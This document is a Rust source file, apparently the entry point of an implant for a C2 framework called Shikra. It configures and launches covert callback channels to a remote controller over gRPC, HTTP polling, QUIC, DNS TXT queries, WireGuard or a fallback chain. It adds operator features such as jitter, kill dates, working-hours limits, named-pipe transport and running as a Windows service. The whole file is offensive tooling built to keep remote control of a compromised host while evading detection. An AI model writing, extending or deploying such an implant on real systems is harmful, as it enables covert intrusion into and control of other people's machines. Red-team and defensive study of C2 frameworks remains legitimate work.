use anyhow::{Context, Result};
use clap::{Parser, ValueEnum};
use shikra_implant::{
    run_agent_piped, run_beacon, run_dns_beacon, run_fallback, run_quic_beacon, run_wg_beacon,
    AgentConfig, BeaconConfig, DnsConfig, EmbeddedConfig, FallbackContext, QuicConfig,
    TransportSpec, WgConfig,
};
use shikra_transport::profile::{C2Profile, ProfileSet};
use shikra_transport::tls::{hex_decode, read_text_file};
use std::path::PathBuf;

#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
enum Mode {
    /// Persistent gRPC session (requires TLS listener).
    Session,
    /// HTTP(S) polling beacon (uses the C2 profile).
    Beacon,
    /// QUIC polling beacon (UDP/443-style transport).
    Quic,
    /// DNS TXT polling beacon.
    Dns,
    /// Userspace WireGuard polling beacon.
    #[value(name = "wireguard", alias = "wire-guard")]
    WireGuard,
    /// Try transports in the order given by --fallback until one connects.
    Fallback,
}

#[derive(Debug, Parser)]
#[command(name = "shikra-implant", version, about = "Shikra implant")]
struct Cli {
    #[arg(long, value_enum)]
    mode: Option<Mode>,

    /// gRPC session endpoint, e.g. https://127.0.0.1:8443
    #[arg(long, env = "SHIKRA_C2_URL")]
    c2_url: Option<String>,

    /// HTTP beacon base URL, e.g. http://127.0.0.1:8080
    #[arg(long, env = "SHIKRA_HTTP_URL")]
    http_url: Option<String>,

    /// QUIC beacon address, e.g. 127.0.0.1:8444
    #[arg(long, env = "SHIKRA_QUIC_URL")]
    quic_url: Option<String>,

    /// DNS beacon server address, e.g. 127.0.0.1:5353
    #[arg(long, env = "SHIKRA_DNS_URL")]
    dns_url: Option<String>,

    /// DNS zone appended to query names.
    #[arg(long, env = "SHIKRA_DNS_ZONE", default_value = "dns.shikra")]
    dns_zone: String,

    /// WireGuard beacon server address, e.g. 127.0.0.1:51820
    #[arg(long, env = "SHIKRA_WG_URL")]
    wg_url: Option<String>,

    /// Server WireGuard static public key as hex (32 bytes).
    #[arg(long, env = "SHIKRA_WG_SERVER_PUBLIC")]
    wg_server_public: Option<String>,

    /// Comma-separated transport order for fallback mode, e.g.
    /// "quic,http,dns,wireguard".
    #[arg(long, env = "SHIKRA_FALLBACK_ORDER")]
    fallback: Option<String>,

    /// Seconds a transport must stay alive before it counts as connected.
    #[arg(long, default_value_t = 12)]
    fallback_connect_timeout_secs: u64,

    /// QUIC TLS server name (SNI).
    #[arg(long, env = "SHIKRA_QUIC_SERVER_NAME")]
    quic_server_name: Option<String>,

    #[arg(long, env = "SHIKRA_CA_CERT")]
    ca_cert: Option<PathBuf>,

    #[arg(long, env = "SHIKRA_SERVER_IDENTITY")]
    server_identity: Option<PathBuf>,

    #[arg(long, env = "SHIKRA_ENROLL_TOKEN")]
    enroll_token: Option<String>,

    /// Server identity public key as hex (alternative to --server-identity file).
    #[arg(long, env = "SHIKRA_SERVER_IDENTITY_HEX")]
    server_identity_hex: Option<String>,

    /// CA certificate PEM inline (alternative to --ca-cert file).
    #[arg(long, env = "SHIKRA_CA_PEM")]
    ca_pem: Option<String>,

    #[arg(long, env = "SHIKRA_TLS_DOMAIN", default_value = "localhost")]
    tls_domain: String,

    /// Directory containing profile.json (defaults to built-in profile).
    #[arg(long)]
    profile_dir: Option<PathBuf>,

    /// Poll interval override in seconds (beacon mode).
    #[arg(long)]
    poll_interval_secs: Option<u64>,

    /// Jitter override in seconds (beacon mode).
    #[arg(long)]
    jitter_secs: Option<u64>,

    #[arg(long, default_value_t = 15)]
    heartbeat_secs: u64,

    #[arg(long, default_value_t = 5)]
    jitter: u64,

    #[arg(long)]
    max_runtime_secs: Option<u64>,

    /// Unix timestamp after which the agent terminates (0 = never).
    #[arg(long, env = "SHIKRA_KILLDATE", default_value_t = 0)]
    killdate: u64,

    /// Agent-local working-hours window, e.g. "9:00-17:00" (empty = always).
    #[arg(long, env = "SHIKRA_WORKING_HOURS", default_value = "")]
    working_hours: String,

    /// Session transport override: connect through a named pipe
    /// (`\\HOST\pipe\name`) or Unix socket path instead of TCP.
    #[arg(long, env = "SHIKRA_PIPE")]
    pipe: Option<String>,
}

fn resolve_quic_server_name(cli: &Cli, embedded: Option<&EmbeddedConfig>) -> String {
    cli.quic_server_name
        .clone()
        .or_else(|| {
            embedded
                .as_ref()
                .map(|config| config.tls_domain.clone())
                .filter(|domain| !domain.is_empty())
        })
        .unwrap_or_else(|| "localhost".to_string())
}

fn resolve_server_identity(cli: &Cli, embedded: Option<&EmbeddedConfig>) -> Result<[u8; 32]> {
    let hex_value = if let Some(path) = &cli.server_identity {
        read_text_file(path)?
    } else if let Some(hex_value) = &cli.server_identity_hex {
        hex_value.clone()
    } else if let Some(embedded) = embedded {
        embedded.server_identity_hex.clone()
    } else {
        anyhow::bail!(
            "server identity required (--server-identity/--server-identity-hex or embedded config)"
        );
    };
    let bytes = hex_decode(&hex_value)?;
    let identity: [u8; 32] = bytes
        .as_slice()
        .try_into()
        .context("server identity public key must be 32 bytes")?;
    Ok(identity)
}

fn resolve_ca_pem(cli: &Cli, embedded: Option<&EmbeddedConfig>) -> Result<String> {
    if let Some(path) = &cli.ca_cert {
        return read_text_file(path);
    }
    if let Some(pem) = &cli.ca_pem {
        return Ok(pem.clone());
    }
    if let Some(embedded) = embedded {
        if !embedded.ca_pem.is_empty() {
            return Ok(embedded.ca_pem.clone());
        }
    }
    anyhow::bail!("CA certificate required (--ca-cert/--ca-pem or embedded config)")
}

fn main() -> Result<()> {
    #[cfg(windows)]
    {
        if let Some(config) = EmbeddedConfig::load() {
            let name = config.service_name.trim().to_string();
            if !name.is_empty() && shikra_implant::win_service::run(&name, run_implant_blocking) {
                return Ok(());
            }
        }
    }
    run_implant_blocking()
}

fn run_implant_blocking() -> Result<()> {
    tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()?
        .block_on(run_implant())
}

async fn run_implant() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .init();

    let cli = Cli::parse();
    let embedded = EmbeddedConfig::load();
    if embedded.is_some() {
        tracing::info!("using embedded build configuration");
    }

    let mode =
        cli.mode.unwrap_or_else(
            || match embedded.as_ref().map(|config| config.mode.as_str()) {
                Some("beacon") => Mode::Beacon,
                Some("quic") => Mode::Quic,
                Some("dns") => Mode::Dns,
                Some("wireguard") => Mode::WireGuard,
                Some("fallback") => Mode::Fallback,
                _ => Mode::Session,
            },
        );

    let enroll_token = cli
        .enroll_token
        .clone()
        .or_else(|| embedded.as_ref().map(|config| config.enroll_token.clone()))
        .context("enrollment token required (--enroll-token or embedded config)")?;

    let server_identity = resolve_server_identity(&cli, embedded.as_ref())?;

    let killdate = if cli.killdate > 0 {
        cli.killdate
    } else {
        embedded
            .as_ref()
            .map(|config| config.killdate_unix)
            .unwrap_or_default()
    };
    let working_hours = if !cli.working_hours.trim().is_empty() {
        cli.working_hours.clone()
    } else {
        embedded
            .as_ref()
            .map(|config| config.working_hours.clone())
            .unwrap_or_default()
    };
    shikra_implant::limits::set(killdate, working_hours);

    match mode {
        Mode::Session => {
            let endpoint = cli
                .c2_url
                .clone()
                .or_else(|| embedded.as_ref().map(|config| config.c2_url.clone()))
                .filter(|url| !url.is_empty())
                .context("C2 URL required for session mode")?;
            let ca_pem = resolve_ca_pem(&cli, embedded.as_ref())?;
            let pipe = cli
                .pipe
                .clone()
                .filter(|pipe| !pipe.trim().is_empty())
                .or_else(|| {
                    embedded
                        .as_ref()
                        .map(|config| config.pipe_path.clone())
                        .filter(|pipe| !pipe.trim().is_empty())
                });
            run_agent_piped(
                AgentConfig {
                    endpoint,
                    ca_pem,
                    server_identity,
                    enroll_token,
                    domain: cli.tls_domain,
                    heartbeat_secs: cli.heartbeat_secs,
                    jitter_secs: cli.jitter,
                    max_runtime_secs: cli
                        .max_runtime_secs
                        .or(embedded.as_ref().and_then(|c| c.max_runtime_secs)),
                },
                pipe,
            )
            .await
        }
        Mode::Beacon => {
            let base_url = cli
                .http_url
                .clone()
                .or_else(|| embedded.as_ref().map(|config| config.http_url.clone()))
                .filter(|url| !url.is_empty())
                .context("C2 URL required for beacon mode")?;
            let mut profiles = match &cli.profile_dir {
                Some(dir) => ProfileSet::load_or_default(dir)?,
                None => match embedded
                    .as_ref()
                    .map(|config| config.profiles.clone())
                    .filter(|profiles| !profiles.is_empty())
                {
                    Some(profiles) => ProfileSet { profiles },
                    None => ProfileSet::default(),
                },
            };
            for profile in &mut profiles.profiles {
                if let Some(interval) = cli
                    .poll_interval_secs
                    .or(embedded.as_ref().and_then(|c| c.poll_interval_secs))
                {
                    profile.poll_interval_secs = interval;
                }
                if let Some(jitter) = cli.jitter_secs {
                    profile.jitter_secs = jitter;
                }
            }
            run_beacon(BeaconConfig {
                base_url,
                ca_pem: None,
                server_identity,
                enroll_token,
                profiles,
                max_runtime_secs: cli
                    .max_runtime_secs
                    .or(embedded.as_ref().and_then(|c| c.max_runtime_secs)),
            })
            .await
        }
        Mode::Quic => {
            let server_addr = cli
                .quic_url
                .clone()
                .or_else(|| embedded.as_ref().map(|config| config.quic_url.clone()))
                .filter(|url| !url.is_empty())
                .context("QUIC URL required for quic mode")?;
            let ca_pem = resolve_ca_pem(&cli, embedded.as_ref())?;
            let mut profile = match &cli.profile_dir {
                Some(dir) => C2Profile::load_or_default(dir)?,
                None => C2Profile::default(),
            };
            if let Some(interval) = cli
                .poll_interval_secs
                .or(embedded.as_ref().and_then(|c| c.poll_interval_secs))
            {
                profile.poll_interval_secs = interval;
            }
            if let Some(jitter) = cli.jitter_secs {
                profile.jitter_secs = jitter;
            }
            run_quic_beacon(QuicConfig {
                server_addr,
                server_name: resolve_quic_server_name(&cli, embedded.as_ref()),
                ca_pem,
                server_identity,
                enroll_token,
                profile,
                max_runtime_secs: cli
                    .max_runtime_secs
                    .or(embedded.as_ref().and_then(|c| c.max_runtime_secs)),
            })
            .await
        }
        Mode::Dns => {
            let server_addr = cli
                .dns_url
                .clone()
                .or_else(|| embedded.as_ref().map(|config| config.dns_url.clone()))
                .filter(|url| !url.is_empty())
                .context("DNS URL required for dns mode")?;
            let zone = if cli.dns_zone != "dns.shikra" {
                cli.dns_zone.clone()
            } else {
                embedded
                    .as_ref()
                    .map(|config| config.dns_zone.clone())
                    .filter(|zone| !zone.is_empty())
                    .unwrap_or(cli.dns_zone.clone())
            };
            let profile = beacon_profile(&cli, embedded.as_ref())?;
            run_dns_beacon(DnsConfig {
                server_addr,
                zone,
                server_identity,
                enroll_token,
                profile,
                max_runtime_secs: cli
                    .max_runtime_secs
                    .or(embedded.as_ref().and_then(|c| c.max_runtime_secs)),
            })
            .await
        }
        Mode::WireGuard => {
            let server_addr = cli
                .wg_url
                .clone()
                .or_else(|| embedded.as_ref().map(|config| config.wg_url.clone()))
                .filter(|url| !url.is_empty())
                .context("WireGuard URL required for wireguard mode")?;
            let public_hex = cli
                .wg_server_public
                .clone()
                .or_else(|| {
                    embedded
                        .as_ref()
                        .map(|config| config.wg_server_public.clone())
                })
                .filter(|value| !value.is_empty())
                .context("WireGuard server public key required (--wg-server-public)")?;
            let bytes = hex_decode(&public_hex)?;
            let server_public: [u8; 32] = bytes
                .as_slice()
                .try_into()
                .context("WireGuard server public key must be 32 bytes")?;
            let profile = beacon_profile(&cli, embedded.as_ref())?;
            run_wg_beacon(WgConfig {
                server_addr,
                server_public,
                server_identity,
                enroll_token,
                profile,
                max_runtime_secs: cli
                    .max_runtime_secs
                    .or(embedded.as_ref().and_then(|c| c.max_runtime_secs)),
            })
            .await
        }
        Mode::Fallback => {
            let order = cli
                .fallback
                .clone()
                .or_else(|| {
                    embedded
                        .as_ref()
                        .map(|config| config.fallback_order.clone())
                })
                .filter(|value| !value.is_empty())
                .context("fallback order required for fallback mode (--fallback quic,http,dns)")?;
            let profiles = match &cli.profile_dir {
                Some(dir) => ProfileSet::load_or_default(dir)?,
                None => match embedded
                    .as_ref()
                    .map(|config| config.profiles.clone())
                    .filter(|profiles| !profiles.is_empty())
                {
                    Some(profiles) => ProfileSet { profiles },
                    None => ProfileSet::default(),
                },
            };
            let embedded_dns_zone = embedded
                .as_ref()
                .map(|config| config.dns_zone.clone())
                .filter(|zone| !zone.is_empty())
                .unwrap_or_else(|| cli.dns_zone.clone());
            let mut specs = Vec::new();
            for name in order.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                match name.to_ascii_lowercase().as_str() {
                    "http" | "https" => {
                        let base_url = cli
                            .http_url
                            .clone()
                            .or_else(|| embedded.as_ref().map(|config| config.http_url.clone()))
                            .filter(|url| !url.is_empty())
                            .context("--http-url is required for the http fallback leg")?;
                        specs.push(TransportSpec::Http {
                            base_url,
                            profiles: profiles.clone(),
                        });
                    }
                    "quic" => {
                        let server_addr = cli
                            .quic_url
                            .clone()
                            .or_else(|| embedded.as_ref().map(|config| config.quic_url.clone()))
                            .filter(|url| !url.is_empty())
                            .context("--quic-url is required for the quic fallback leg")?;
                        specs.push(TransportSpec::Quic {
                            server_addr,
                            server_name: resolve_quic_server_name(&cli, embedded.as_ref()),
                            ca_pem: resolve_ca_pem(&cli, embedded.as_ref())?,
                        });
                    }
                    "dns" => {
                        let server_addr = cli
                            .dns_url
                            .clone()
                            .or_else(|| embedded.as_ref().map(|config| config.dns_url.clone()))
                            .filter(|url| !url.is_empty())
                            .context("--dns-url is required for the dns fallback leg")?;
                        specs.push(TransportSpec::Dns {
                            server_addr,
                            zone: embedded_dns_zone.clone(),
                        });
                    }
                    "wireguard" | "wg" => {
                        let server_addr = cli
                            .wg_url
                            .clone()
                            .or_else(|| embedded.as_ref().map(|config| config.wg_url.clone()))
                            .filter(|url| !url.is_empty())
                            .context("--wg-url is required for the wireguard fallback leg")?;
                        let public_hex = cli
                            .wg_server_public
                            .clone()
                            .or_else(|| {
                                embedded
                                    .as_ref()
                                    .map(|config| config.wg_server_public.clone())
                            })
                            .filter(|value| !value.is_empty())
                            .context(
                                "--wg-server-public is required for the wireguard fallback leg",
                            )?;
                        let bytes = hex_decode(&public_hex)?;
                        let server_public: [u8; 32] = bytes
                            .as_slice()
                            .try_into()
                            .context("WireGuard server public key must be 32 bytes")?;
                        specs.push(TransportSpec::WireGuard {
                            server_addr,
                            server_public,
                        });
                    }
                    other => anyhow::bail!("unknown fallback transport: {other}"),
                }
            }
            run_fallback(
                specs,
                FallbackContext {
                    server_identity,
                    enroll_token,
                    max_runtime_secs: cli
                        .max_runtime_secs
                        .or(embedded.as_ref().and_then(|c| c.max_runtime_secs)),
                },
                std::time::Duration::from_secs(cli.fallback_connect_timeout_secs),
            )
            .await
        }
    }
}

fn beacon_profile(cli: &Cli, embedded: Option<&EmbeddedConfig>) -> Result<C2Profile> {
    let mut profile = match &cli.profile_dir {
        Some(dir) => C2Profile::load_or_default(dir)?,
        None => C2Profile::default(),
    };
    if let Some(interval) = cli
        .poll_interval_secs
        .or(embedded.and_then(|c| c.poll_interval_secs))
    {
        profile.poll_interval_secs = interval;
    }
    if let Some(jitter) = cli.jitter_secs {
        profile.jitter_secs = jitter;
    }
    Ok(profile)
}
